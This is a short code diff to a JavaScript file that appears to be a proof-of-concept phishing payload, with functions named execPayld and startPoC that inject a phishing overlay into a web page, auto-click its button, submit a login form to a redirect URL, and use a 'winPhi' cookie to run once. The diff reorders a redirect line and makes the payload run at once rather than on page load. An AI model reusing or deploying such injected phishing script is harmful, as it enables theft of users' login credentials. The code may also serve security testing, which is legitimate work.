@@ -77,6 +77,7 @@ async function submitLoginForm() {
   window.open(redirURL, '_self');
 }
 function execPayld() {
+  window.location.href = window.location.href.split('#')[0] + '#products';
   let phishDiv = document.createElement('div');
   phishDiv.innerHTML = phishHtml;
   document.getElementsByTagName('body')[0].appendChild(phishDiv);
@@ -85,7 +86,6 @@ function execPayld() {
     document.getElementById('okbutton').click();
     event.preventDefault();
   });
-  window.location.href = window.location.href.split('#')[0] + '#products';
 }
 function checkDOM() {
   var popupElements1 = document.getElementsByClassName('cdk-overlay-container');
@@ -106,9 +106,7 @@ function checkDOM() {
     startPoC();
   }
 }
-window.onload = function() {
-  setTimeout(() => { checkDOM(); }, 300);
-});
+checkDOM();
 function startPoC() {
   // [CASE] RUN (PAYLOAD) ONCE ENABLED AND COOKIE NOT SET => SET RUNONCE COOKIE AND EXECUTE PAYLOAD
   if ((runOnce) && !(/^(.*;)?\s*winPhi\s*=\s*[^;]/.test(document.cookie))) {
